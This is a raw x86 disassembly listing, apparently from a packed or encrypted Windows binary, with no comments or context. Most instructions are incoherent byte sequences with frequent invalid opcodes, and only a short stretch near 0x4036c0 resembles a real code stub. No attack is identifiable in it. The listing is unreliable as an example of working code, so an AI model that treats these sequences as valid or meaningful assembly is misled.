  403156:	test   DWORD PTR [ecx+0x7b],esp
  403159:	inc    ecx
  40315a:	loop   0x4031cb
  40315c:	xor    BYTE PTR [esi+0x647100a],dh
  403162:	enter  0xa415,0x23
  403166:	ja     0x4031ab
  403168:	sub    ah,BYTE PTR [esi+edx*4-0xce90c85]
  40316f:	jl     0x403153
  403171:	push   esp
  403172:	xchg   ah,ch
  403174:	and    eax,0xd6a0a147
  403179:	ja     0x403160
  40317b:	cmp    eax,0x125bba86
  403180:	pop    ebx
  403181:	cmp    BYTE PTR ds:0x5183f0ce,bh
  403187:	mov    edi,fs
  403189:	das    
  40318a:	int    0xd7
  40318c:	bound  ecx,QWORD PTR [edx]
  40318e:	in     eax,dx
  40318f:	imul   esp,DWORD PTR [edx],0xfffffff9
  403192:	out    0x50,al
  403194:	lods   al,BYTE PTR ds:[esi]
  403195:	test   DWORD PTR [edx+0x2a4a0be],0xfdbc270a
  40319f:	and    al,BYTE PTR [edi+0x5b]
  4031a2:	je     0x403175
  4031a4:	std    
  4031a5:	mov    ds:0x93e6692,al
  4031aa:	mov    esp,0x30e7b704
  4031af:	and    al,0x8d
  4031b1:	jg     0x4031fe
  4031b3:	inc    esp
  4031b4:	nop
  4031b5:	inc    esp
  4031b6:	jb     0x4031f8
  4031b8:	dec    eax
  4031b9:	mov    ds,WORD PTR [esi-0x26199aca]
  4031bf:	jb     0x403213
  4031c1:	inc    eax
  4031c2:	push   esi
  4031c3:	lods   al,BYTE PTR ds:[esi]
  4031c4:	cmp    al,0x2
  4031c6:	mov    ecx,0x2838c8f
  4031cb:	or     bl,BYTE PTR [eax+0x5f]
  4031ce:	inc    edi
  4031cf:	test   DWORD PTR [eax],eax
  4031d1:	jle    0x40323f
  4031d3:	sbb    al,0x49
  4031d5:	hlt    
  4031d6:	sub    eax,0x3727f39e
  4031db:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4031dd:	retf   0x79c9
  4031e0:	pushf  
  4031e1:	xor    DWORD PTR [edi],0x38de0b85
  4031e7:	add    dl,BYTE PTR [eax]
  4031e9:	outs   dx,DWORD PTR ds:[esi]
  4031ea:	cdq    
  4031eb:	add    esi,eax
  4031ed:	and    BYTE PTR [esi],dh
  4031ef:	jle    0x40323c
  4031f1:	cwde   
  4031f2:	sbb    bl,BYTE PTR [eax+0x1d82fedb]
  4031f8:	call   0xe543d2ef
  4031fd:	or     BYTE PTR [esi],dl
  4031ff:	aaa    
  403200:	ins    BYTE PTR es:[edi],dx
  403201:	xor    eax,0xcea2f5db
  403206:	fxch   st(3)
  403208:	mov    eax,0x9003f63
  40320d:	ins    DWORD PTR es:[edi],dx
  40320e:	(bad)  
  40320f:	ins    BYTE PTR es:[edi],dx
  403210:	pop    ebx
  403211:	xchg   BYTE PTR [ebp+0x45],bh
  403214:	add    DWORD PTR [edx+esi*2],edi
  403217:	cmp    eax,0xff84e4c5
  40321c:	lahf   
  40321d:	int3   
  40321e:	inc    edx
  40321f:	cmc    
  403220:	cmp    eax,0xec90526b
  403225:	fidiv  WORD PTR ss:[eax]
  403228:	stos   DWORD PTR es:[edi],eax
  403229:	mov    esp,0x560b0073
  40322e:	imul   ebx,DWORD PTR [esi],0x6d693f5e
  403234:	mov    dh,0xe0
  403236:	cmova  ecx,DWORD PTR ds:0x6a6d9c99
  40323d:	jle    0x403200
  40323f:	sub    DWORD PTR es:[ebx-0x4],edi
  403243:	je     0x40322b
  403245:	aaa    
  403246:	retf   
  403247:	loop   0x40328e
  403249:	pop    ss
  40324a:	outs   dx,BYTE PTR ds:[esi]
  40324b:	ins    BYTE PTR es:[edi],dx
  40324c:	jmp    0x8ccb:0x423fe773
  403253:	pusha  
  403254:	and    edx,DWORD PTR [ebp-0x75b1b503]
  40325a:	xlat   BYTE PTR ds:[ebx]
  40325b:	and    edx,DWORD PTR [edi]
  40325d:	jecxz  0x4032b7
  40325f:	mov    al,BYTE PTR [esi-0x1e]
  403262:	fcmovbe st,st(1)
  403264:	xor    al,0x46
  403266:	pop    ebp
  403267:	jno    0x403222
  403269:	jp     0x40321f
  40326b:	push   0xc3167aa8
  403270:	jg     0x403253
  403272:	cmp    dh,BYTE PTR [edi]
  403274:	addr16 loope 0x4032c4
  403277:	repz in al,dx
  403279:	cdq    
  40327a:	loop   0x40327a
  40327c:	fst    DWORD PTR [eax-0x70]
  40327f:	mov    bl,0xf6
  403281:	push   es
  403282:	push   eax
  403283:	adc    esi,DWORD PTR [ebx]
  403285:	adc    bl,BYTE PTR [ecx-0x44]
  403288:	pop    ss
  403289:	(bad)
  40328c:	push   esp
  40328d:	into   
  40328e:	fmul   st(7),st
  403290:	jmp    0x546dd8c5
  403295:	retf   0xc147
  403298:	and    al,0x10
  40329a:	or     al,0xc8
  40329c:	aad    0xc9
  40329e:	mov    cl,0xcc
  4032a0:	sahf   
  4032a1:	xlat   BYTE PTR ds:[ebx]
  4032a2:	pushf  
  4032a3:	jns    0x403265
  4032a5:	idiv   DWORD PTR [ebp+0x74]
  4032a8:	fild   DWORD PTR [edx+0x45]
  4032ab:	and    ebp,edx
  4032ad:	cdq    
  4032ae:	mov    eax,0xa025260e
  4032b3:	pop    ds
  4032b4:	sub    eax,0x16578968
  4032b9:	pop    edx
  4032ba:	fs aam 0xcc
  4032bd:	mov    edi,DWORD PTR ds:0xddc1d5eb
  4032c3:	dec    esi
  4032c4:	aas    
  4032c5:	xchg   ebp,eax
  4032c6:	lods   al,BYTE PTR ds:[esi]
  4032c7:	inc    ecx
  4032c8:	pop    esi
  4032c9:	dec    cl
  4032cb:	ret    0x6fa6
  4032ce:	rol    BYTE PTR [ecx],cl
  4032d0:	inc    ecx
  4032d1:	adc    ch,0xc8
  4032d4:	push   edi
  4032d5:	mov    eax,ds:0x8120797f
  4032da:	adc    ebx,DWORD PTR [eax]
  4032dc:	int3   
  4032dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032de:	stc    
  4032df:	add    ebp,DWORD PTR [esi+0x6f3cb1d8]
  4032e5:	loopne 0x403305
  4032e7:	lds    ebp,FWORD PTR [ecx+0x2b]
  4032ea:	add    eax,0xc0f6c12b
  4032ef:	inc    eax
  4032f0:	pop    ss
  4032f1:	into   
  4032f2:	cmp    BYTE PTR [edx],bl
  4032f4:	and    eax,0xd0232e12
  4032f9:	icebp  
  4032fa:	inc    edx
  4032fb:	mov    edx,0xf415dcb6
  403300:	rcl    ch,cl
  403302:	cdq    
  403303:	push   edi
  403304:	ds inc edx
  403306:	retf   
  403307:	sbb    eax,0xb9cf9bc9
  40330c:	adc    DWORD PTR [ebp-0x56],ebp
  40330f:	push   ecx
  403310:	inc    ecx
  403311:	add    BYTE PTR [edi],bh
  403313:	fmul   DWORD PTR [esi+eax*8-0x51]
  403317:	icebp  
  403318:	imul   ecx,DWORD PTR [edi],0x5a15cc2f
  40331e:	mov    ecx,0xa4eabd02
  403323:	(bad)  
  403324:	cmp    edi,DWORD PTR [esi+0x58625a21]
  40332a:	sbb    DWORD PTR [ebp-0x46],edi
  40332d:	add    esi,ebx
  40332f:	lock fcom DWORD PTR [eax+0x3d]
  403333:	or     al,0x29
  403335:	pop    es
  403336:	sahf   
  403337:	repz inc eax
  403339:	out    dx,eax
  40333a:	xor    al,0x6e
  40333c:	jbe    0x4032eb
  40333e:	add    dh,dl
  403340:	frstor [ebp-0x2a045cdd]
  403346:	jnp    0x4033b5
  403348:	jne    0x40333a
  40334a:	pushf  
  40334b:	xchg   BYTE PTR [esp+eax*4+0x22f0d5f8],ah
  403352:	xor    BYTE PTR [ebx+0xd],bl
  403355:	push   eax
  403356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403357:	sbb    ecx,DWORD PTR [esi]
  403359:	jne    0x4033b8
  40335b:	and    DWORD PTR [ecx+eiz*8],edi
  40335e:	int    0xa1
  403360:	dec    eax
  403361:	test   eax,0x3a23407e
  403366:	push   edx
  403367:	sub    dl,bl
  403369:	sbb    BYTE PTR [edi+0x6186963e],bh
  40336f:	int3   
  403370:	pop    ebp
  403371:	cmp    al,ah
  403373:	sub    eax,0x40156e04
  403378:	push   ebx
  403379:	sub    al,0x11
  40337b:	add    al,0x28
  40337d:	push   0x7c38ab1d
  403382:	nop    DWORD PTR [ebp-0x4f]
  403386:	mov    WORD PTR [edi],ss
  403388:	faddp  st(0),st
  40338a:	ja     0x4033fd
  40338c:	dec    edi
  40338d:	clc    
  40338e:	and    al,0x69
  403390:	scas   eax,DWORD PTR es:[edi]
  403391:	imul   ebp,ecx,0x13
  403394:	mov    bh,0xf9
  403396:	dec    ecx
  403397:	test   al,0x63
  403399:	sbb    al,0x59
  40339b:	mov    esi,DWORD PTR [ebp+0x8]
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	outs   dx,BYTE PTR ds:[esi]
  4033ba:	or     eax,0x143a24d1
  4033bf:	jo     0x403431
  4033c1:	mov    esi,0xa970707e
  4033c6:	jbe    0x403400
  4033c8:	jo     0x4033e0
  4033ca:	mov    ebp,0xf00cdab7
  4033cf:	or     eax,0x87e14080
  4033d4:	outs   dx,BYTE PTR ds:[esi]
  4033d5:	fiadd  WORD PTR [edi-0x3c6a084c]
  4033db:	inc    eax
  4033dc:	ss jg  0x403368
  4033df:	mov    bl,0xa3
  4033e1:	jbe    0x40341a
  4033e3:	mov    ds:0xb0176d34,eax
  4033e8:	cwde   
  4033e9:	fwait
  4033ea:	pop    esi
  4033eb:	or     al,bh
  4033ed:	in     al,dx
  4033ee:	sbb    DWORD PTR [esi],esi
  4033f0:	nop
  4033f1:	notrack jmp ebx
  4033f4:	das    
  4033f5:	pop    es
  4033f6:	xlat   BYTE PTR ds:[ebx]
  4033f7:	push   esi
  4033f8:	mov    ah,0x3d
  4033fa:	into   
  4033fb:	daa    
  4033fc:	xor    esi,DWORD PTR [esi-0x72]
  4033ff:	test   BYTE PTR [edx],0x22
  403402:	xor    eax,0x262bd7f5
  403407:	xor    esi,DWORD PTR [esi+0x16]
  40340a:	imul   ebx,DWORD PTR [ebx+0x14],0x3f4b9832
  403411:	pop    ecx
  403412:	lock cmp BYTE PTR [eax-0x27],dh
  403416:	retf   0x311
  403419:	pop    ss
  40341a:	inc    ebp
  40341b:	sub    esp,DWORD PTR gs:[ecx]
  40341e:	inc    eax
  40341f:	sub    edi,DWORD PTR [ebx+0x403f0cc7]
  403425:	lods   al,BYTE PTR ds:[esi]
  403426:	(bad)  
  403427:	in     eax,dx
  403428:	and    BYTE PTR [ecx],cl
  40342a:	dec    ecx
  40342b:	pusha  
  40342c:	int    0x91
  40342e:	sub    DWORD PTR [ecx+0x51],edi
  403431:	add    DWORD PTR [eax+0x71],0xffffffa8
  403435:	add    BYTE PTR [edx],ch
  403437:	mov    ah,0x1f
  403439:	xor    cl,al
  40343b:	inc    ebx
  40343c:	(bad)  
  40343d:	mov    ah,0x9c
  40343f:	lea    esp,ds:0xb097e369
  403445:	jnp    0x40343e
  403447:	jns    0x40349f
  403449:	cmp    ecx,DWORD PTR gs:[edi]
  40344c:	push   ebp
  40344d:	not    DWORD PTR [ecx]
  40344f:	mov    cl,0xe2
  403451:	dec    esi
  403452:	jle    0x40347c
  403454:	adc    BYTE PTR [ebx-0x6052676a],dh
  40345a:	out    dx,al
  40345b:	add    eax,0xa30539e7
  403460:	and    BYTE PTR [edi+0x753ae195],cl
  403466:	mov    ah,0x56
  403468:	cmp    eax,0x8df0a038
  40346d:	jbe    0x4034a0
  40346f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403470:	fst    QWORD PTR [ecx+0x74d2a7e0]
  403476:	out    dx,al
  403477:	xchg   ecx,eax
  403478:	dec    esp
  403479:	add    al,0x92
  40347b:	enter  0x894c,0x78
  40347f:	enter  0x8cff,0xe2
  403483:	sub    dl,dl
  403485:	mov    esp,0x4ad887e
  40348a:	and    BYTE PTR [ecx-0x78],al
  40348d:	rcr    DWORD PTR [ebx-0x27],1
  403490:	inc    ecx
  403491:	jno    0x4034b8
  403493:	push   0xbfd80fd9
  403498:	int3   
  403499:	jmp    0xc40c58ca
  40349e:	div    dl
  4034a0:	outs   dx,BYTE PTR ds:[esi]
  4034a1:	push   0xffffff87
  4034a3:	sbb    BYTE PTR [edi],bh
  4034a5:	imul   ebp,DWORD PTR [esi],0x27
  4034a8:	mov    esi,0x38050232
  4034ad:	push   eax
  4034ae:	scas   al,BYTE PTR es:[edi]
  4034af:	jp     0x40352b
  4034b1:	xor    esi,DWORD PTR [esi+0x3d84587]
  4034b7:	retf   0xcf6a
  4034ba:	popa   
  4034bb:	(bad)  
  4034bc:	sub    BYTE PTR [edi],dh
  4034be:	outs   dx,BYTE PTR ds:[esi]
  4034bf:	dec    esp
  4034c0:	xchg   ebp,eax
  4034c1:	pusha  
  4034c2:	jns    0x40344e
  4034c4:	pop    esi
  4034c5:	sbb    BYTE PTR [ecx-0xb24b320],0x25
  4034cc:	or     ecx,DWORD PTR ds:0x9fb0a098
  4034d2:	les    ebx,FWORD PTR [eax+0x5bf6945b]
  4034d8:	cld    
  4034d9:	enter  0x5151,0xe9
  4034dd:	add    ebx,DWORD PTR fs:[ecx]
  4034e0:	scas   eax,DWORD PTR es:[edi]
  4034e1:	or     dh,0xc1
  4034e4:	fadd   QWORD PTR [ebx+0xf81aff0]
  4034ea:	inc    edi
  4034eb:	sub    DWORD PTR [esi],ebx
  4034ed:	jbe    0x40355e
  4034ef:	pop    esi
  4034f0:	mov    ecx,0x173625e0
  4034f5:	cwde   
  4034f6:	push   ecx
  4034f7:	out    dx,eax
  4034f8:	mov    edx,0xa028726d
  4034fd:	sbb    BYTE PTR [esi+0x5e],ah
  403500:	inc    edi
  403501:	cmp    al,0xbb
  403503:	aad    0x8a
  403505:	out    0x4,al
  403507:	dec    esp
  403508:	inc    esi
  403509:	or     BYTE PTR [esi-0x7f],bl
  40350c:	jg     0x403582
  40350e:	xor    BYTE PTR [esi+edi*8-0x3c0dd20b],cl
  403515:	popf   
  403516:	int    0x1a
  403518:	aaa    
  403519:	jne    0x40349e
  40351b:	xor    edi,DWORD PTR [esi-0x6686cd2]
  403521:	push   eax
  403522:	outs   dx,DWORD PTR ss:[esi]
  403524:	add    cl,BYTE PTR [esi-0x1bf1ecf7]
  40352a:	pop    edx
  40352b:	mov    cs,WORD PTR [edi-0x36a0459e]
  403531:	stc    
  403532:	hlt    
  403533:	popa   
  403534:	ins    DWORD PTR es:[edi],dx
  403535:	shl    BYTE PTR [edi],cl
  403537:	xlat   BYTE PTR cs:[ebx]
  403539:	iret   
  40353a:	hlt    
  40353b:	pop    edi
  40353c:	mov    ecx,0x4aabe6c7
  403541:	in     al,dx
  403542:	mov    WORD PTR [eax+0x456f9a08],cs
  403548:	imul   edx,ecx,0xfffffff6
  40354b:	inc    ebp
  40354c:	out    0x18,al
  40354e:	add    eax,0x25a36332
  403553:	mov    eax,0x64c2fde
  403558:	or     BYTE PTR ds:0x4b56b126,0xda
  40355f:	sar    BYTE PTR [ecx+0x329e6b8d],1
  403565:	fidivr DWORD PTR [edi]
  403567:	add    BYTE PTR gs:[eax],cl
  40356a:	push   es
  40356b:	ins    BYTE PTR es:[edi],dx
  40356c:	icebp  
  40356d:	mov    ch,0xa9
  40356f:	push   ss
  403570:	push   es
  403571:	add    DWORD PTR [eax-0x6bc2ecbe],ebp
  403577:	and    eax,0x856aa6c4
  40357c:	push   0xffffffad
  40357e:	push   cs
  40357f:	xor    cl,ch
  403581:	test   al,0x59
  403583:	fmul   st,st(0)
  403585:	arpl   WORD PTR [esp+ebp*4+0x59],cx
  403589:	in     eax,dx
  40358a:	xchg   ebx,eax
  40358b:	sbb    edx,DWORD PTR [ecx*8+0x46858b80]
  403592:	pop    edi
  403593:	(bad)  
  403594:	sub    DWORD PTR cs:[ecx],esp
  403597:	in     al,0xb3
  403599:	pop    ecx
  40359a:	sti    
  40359b:	mov    ah,BYTE PTR [esp+ebp*8]
  40359e:	xchg   edx,eax
  40359f:	jb     0x403614
  4035a1:	fmul   QWORD PTR [edi-0xb]
  4035a4:	jno    0x4035a8
  4035a6:	pmaxsw mm7,QWORD PTR [esi+0x27]
  4035aa:	pushf  
  4035ab:	stos   BYTE PTR es:[edi],al
  4035ac:	enter  0xee50,0xbd
  4035b0:	ror    DWORD PTR [edx+0x6b82bb08],1
  4035b6:	xchg   esp,eax
  4035b7:	xchg   esi,eax
  4035b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035b9:	cmp    BYTE PTR [edx-0x18028bed],0x6d
  4035c0:	stc    
  4035c1:	jb     0x4035d1
  4035c3:	int3   
  4035c4:	dec    ecx
  4035c5:	add    al,0x30
  4035c7:	inc    edi
  4035c8:	push   ebp
  4035c9:	fld    DWORD PTR [edi-0x1706d013]
  4035cf:	dec    esp
  4035d0:	pushf  
  4035d1:	add    eax,0x5e1a9090
  4035d6:	sbb    eax,0x67fb4616
  4035db:	mov    ah,0x99
  4035dd:	inc    ebx
  4035de:	jne    0x403620
  4035e0:	ficomp DWORD PTR [esi+0x8]
  4035e3:	int3   
  4035e4:	fwait
  4035e5:	test   al,0x84
  4035e7:	clc    
  4035e8:	adc    al,0xf4
  4035ea:	sbb    DWORD PTR [edi-0x4f],0x10
  4035ee:	retf   0xc856
  4035f1:	fwait
  4035f2:	loope  0x403642
  4035f4:	out    dx,eax
  4035f5:	(bad)  
  4035f6:	sbb    DWORD PTR [esi],ebp
  4035f8:	out    0xf3,eax
  4035fa:	mov    fs,WORD PTR [esi+ecx*1-0x480c3613]
  403601:	inc    ebp
  403602:	push   edi
  403603:	stos   DWORD PTR es:[edi],eax
  403604:	push   eax
  403605:	arpl   WORD PTR [ebx],bx
  403607:	xchg   DWORD PTR [edx],ebx
  403609:	fldcw  WORD PTR [ebp-0x5e]
  40360c:	popf   
  40360d:	jbe    0x403604
  40360f:	jp     0x40366e
  403611:	in     eax,dx
  403612:	cmp    ebp,edi
  403614:	enter  0x243b,0x8b
  403618:	cwde   
  403619:	inc    esp
  40361a:	loope  0x403639
  40361c:	pop    ebx
  40361d:	push   ds
  40361e:	in     eax,dx
  40361f:	loope  0x40369c
  403621:	mov    ds:0xf0cfee9a,eax
  403626:	sbb    BYTE PTR [eax],ah
  403628:	fs mov cl,0x52
  40362b:	xor    al,0xa5
  40362d:	adc    BYTE PTR [ecx+ebp*2-0x34],cl
  403631:	jno    0x40369c
  403633:	fadd   DWORD PTR [ebp-0x31]
  403636:	mov    bl,0x47
  403638:	mov    ebp,0x7b2cefd
  40363d:	sbb    eax,0xc36d6590
  403642:	push   0xeb0ddee0
  403647:	scas   eax,DWORD PTR es:[edi]
  403648:	or     eax,0xec21bccf
  40364d:	xchg   bh,cl
  40364f:	in     eax,dx
  403650:	or     al,0xbd
  403652:	add    edi,DWORD PTR [eax-0x4f0518ff]
  403658:	int    0x8f
  40365a:	test   BYTE PTR [ecx-0x7f],bh
  40365d:	fstp   TBYTE PTR [esi]
  40365f:	jnp    0x4036ae
  403661:	cmc    
  403662:	ja     0x40360d
  403664:	adc    eax,0xf26959d6
  403669:	mov    DWORD PTR [edi],edx
  40366b:	xchg   BYTE PTR [ecx+ebx*1],dl
  40366e:	scas   eax,DWORD PTR es:[edi]
  40366f:	fwait
  403670:	lahf   
  403671:	aad    0xe7
  403673:	lea    eax,[ebx]
  403675:	adc    dl,BYTE PTR [esi]
  403677:	pop    esi
  403678:	shl    ebx,0x0
  40367b:	mov    BYTE PTR [esi-0x46c5bd7f],al
  403681:	cli    
  403682:	add    DWORD PTR [edx],0xffffffa0
  403685:	mov    ds:0x3848a74,eax
  40368a:	pushf  
  40368b:	jb     0x4036bf
  40368d:	add    BYTE PTR [eax+0x458b3704],cl
  403693:	cld    
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    DWORD PTR [eax+0x78913a24],esi
  4037a6:	adc    DWORD PTR [eax+0x70],esi
  4037a9:	cmp    eax,0x7c70707d
  4037ae:	xchg   ecx,eax
  4037af:	and    ecx,ebp
  4037b1:	mov    esi,0x540a7fef
  4037b6:	repz xchg ebp,eax
  4037b8:	mov    WORD PTR [ebx-0x51a56999],gs
  4037be:	inc    ebp
  4037bf:	mov    DWORD PTR ds:0xfdd66a18,eax
  4037c5:	pop    ds
  4037c6:	scas   eax,DWORD PTR es:[edi]
  4037c7:	fmul   DWORD PTR [edx+ecx*1]
  4037ca:	sbb    dl,BYTE PTR [ebx+esi*4]
  4037cd:	pushf  
  4037ce:	(bad)  
  4037cf:	fld    TBYTE PTR [edx+0x11]
  4037d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037d3:	xchg   BYTE PTR [esi+0x2ae6735b],cl
  4037d9:	pop    ebx
  4037da:	sbb    esp,ecx
  4037dc:	inc    ecx
  4037dd:	jecxz  0x403794
  4037df:	sub    DWORD PTR [ebx],esi
  4037e1:	jp     0x40377c
  4037e3:	add    edx,ebp
  4037e5:	loope  0x403835
  4037e7:	lahf   
  4037e8:	ret    
  4037e9:	aaa    
  4037ea:	loopne 0x403839
  4037ec:	outs   dx,DWORD PTR ds:[esi]
  4037ed:	stc    
  4037ee:	mov    ch,0xde
  4037f0:	xchg   ecx,eax
  4037f1:	cld    
  4037f2:	xor    DWORD PTR [ebp+edx*8+0x489af05],eax
  4037f9:	rcr    DWORD PTR [ebp+edx*4+0x25],cl
  4037fd:	out    0xcf,al
  4037ff:	lds    ecx,FWORD PTR [ecx]
  403801:	retf   0x66dc
  403804:	and    eax,0xb1cb0f8c
  403809:	sbb    ebp,DWORD PTR [eax-0x6ddbe4ff]
  40380f:	adc    BYTE PTR [eax-0x51],0x42
  403813:	sbb    eax,0x8c298f5a
  403818:	jmp    0x8d19:0xa678c58b
  40381f:	imul   esi,DWORD PTR [ebx],0x8a9ca632
  403825:	pushf  
  403826:	jle    0x403873
  403828:	jns    0x403876
  40382a:	data16 jo 0x403861
  40382d:	mov    ecx,0x963c362d
  403832:	jl     0x4037e8
  403834:	sar    edx,1
  403836:	daa    
  403837:	jae    0x4037ee
  403839:	dec    ebp
  40383a:	jmp    0x4037e1
  40383c:	pop    ebx
  40383d:	mov    edi,0xae18d3e9
  403842:	test   al,0xb9
  403844:	cmove  ebx,DWORD PTR [edi+ecx*1-0x566c80fa]
  40384c:	arpl   WORD PTR [eax-0x1a],di
  40384f:	les    edx,FWORD PTR [eax]
  403851:	call   0x6b66:0xccfd85f1
  403858:	jae    0x403804
  40385a:	idiv   DWORD PTR [edi-0x16a7ef6a]
  403860:	sub    esi,esi
  403862:	xor    eax,0xdf791a19
  403867:	adc    edx,eax
  403869:	loope  0x403840
  40386b:	adc    ebx,edi
  40386d:	sub    eax,DWORD PTR [edx]
  40386f:	sbb    BYTE PTR [ebp-0x28f3d8e0],cl
  403875:	push   esp
  403876:	cmc    
  403877:	jecxz  0x4038d2
  403879:	fmul   QWORD PTR [edx-0x25]
  40387c:	sub    cl,BYTE PTR [ebx+0x63]
  40387f:	lods   eax,DWORD PTR ds:[esi]
  403880:	stos   BYTE PTR es:[edi],al
  403881:	outs   dx,BYTE PTR ds:[esi]
  403882:	xlat   BYTE PTR ds:[ebx]
  403883:	xchg   esi,eax
  403884:	sbb    BYTE PTR [esi-0x51],ah
  403887:	repz xor eax,0x399f00bb
  40388d:	(bad)  
  40388e:	retf   
  40388f:	div    DWORD PTR [edx-0x3b58f571]
  403895:	pop    esp
  403896:	inc    edi
  403897:	(bad)  
  403898:	xchg   ax,ax
  40389a:	cmp    eax,0x94e96b26
  40389f:	adc    dl,dh
  4038a1:	cmp    edx,DWORD PTR [ecx-0x36]
  4038a4:	mov    ebp,0x6f89c66b
  4038a9:	arpl   WORD PTR [ebx+0x268eb242],bp
  4038af:	pop    ds
  4038b0:	ins    BYTE PTR es:[edi],dx
  4038b1:	fiadd  DWORD PTR [edx-0x1ffe40f2]
  4038b7:	call   0x6ff60599
  4038bc:	add    al,BYTE PTR [ebp-0x46]
  4038bf:	aad    0xe2
  4038c1:	call   0x341b01fb
  4038c6:	(bad)  
  4038c7:	fs inc esi
  4038c9:	bound  edx,QWORD PTR [ebx+0x6fa0511e]
  4038cf:	xlat   BYTE PTR ss:[ebx]
  4038d1:	bound  esi,QWORD PTR ds:0xa4e59ed7
  4038d7:	inc    esi
  4038d8:	mov    ebp,0x2d5cc1e5
  4038dd:	sbb    eax,0xaa46521f
  4038e2:	jmp    0x500:0x11bf1258
  4038e9:	dec    ecx
  4038ea:	sub    eax,0x33b2a25
  4038ef:	cmp    eax,0x14625066
  4038f4:	repnz pop ss
  4038f6:	ret    
  4038f7:	sub    al,0x24
  4038f9:	adc    al,BYTE PTR [ebx+edx*4+0x27f58446]
  403900:	fwait
  403901:	add    eax,0xc350c390
  403906:	mov    DWORD PTR [ecx],edi
  403908:	add    BYTE PTR [ebx-0x645d1f0c],dh
  40390e:	mov    bh,0x85
  403910:	clc    
  403911:	imul   ecx,DWORD PTR [esi+0x627cfda4],0xffffffbc
  403918:	sbb    cl,BYTE PTR [edi-0x46]
  40391b:	shr    BYTE PTR [eax+0x5e],0xc7
  40391f:	xor    eax,0xeefde288
  403924:	mov    bl,0x6c
  403926:	push   ds
  403927:	sub    cl,BYTE PTR [esp+esi*2-0x2e]
  40392b:	push   ebx
  40392c:	faddp  st(1),st
  40392e:	fisub  DWORD PTR [ebx+0x54]
  403931:	(bad)  
  403932:	mov    al,0x6
  403934:	jne    0x4038ce
  403936:	mov    ds:0x394979cc,al
  40393b:	scas   eax,DWORD PTR es:[di]
  40393d:	fucomp st(2)
  40393f:	scas   al,BYTE PTR es:[edi]
  403940:	rcr    BYTE PTR [esi+0x63],cl
  403943:	hlt    
  403944:	or     eax,0xe0ac145b
  403949:	xchg   ebp,eax
  40394a:	cld    
  40394b:	int3   
  40394c:	and    al,0xdf
  40394e:	pop    ebx
  40394f:	lahf   
  403950:	dec    ecx
  403951:	gs mov edx,0xaebcace4
  403957:	xor    DWORD PTR [edi+ebp*8+0xc7ba5bb],0xee555332
  403962:	loopne 0x403969
  403964:	cmp    al,0x64
  403966:	sub    DWORD PTR cs:[ecx+0x17],edx
  40396a:	sbb    DWORD PTR [ebp-0x44],esi
  40396d:	imul   ebp,esi,0x38c66236
  403973:	ss (bad) 
  403975:	ror    DWORD PTR [ebx+0x4e],cl
  403978:	imul   ebx,ebp,0xffffffbd
  40397b:	rcl    dl,1
  40397d:	test   cl,bh
  40397f:	cmp    eax,ecx
  403981:	dec    eax
  403982:	test   eax,0x36b2df01
  403987:	(bad)  
  403988:	(bad)  
  403989:	jg     0x40394e
  40398b:	cmp    DWORD PTR [eax+0x26],esi
  40398e:	stos   BYTE PTR es:[edi],al
  40398f:	test   al,0x6e
  403991:	fcomp  QWORD PTR [ebp-0x270afe0e]
  403997:	idiv   DWORD PTR [edi+0x73]
  40399a:	ds adc dl,ah
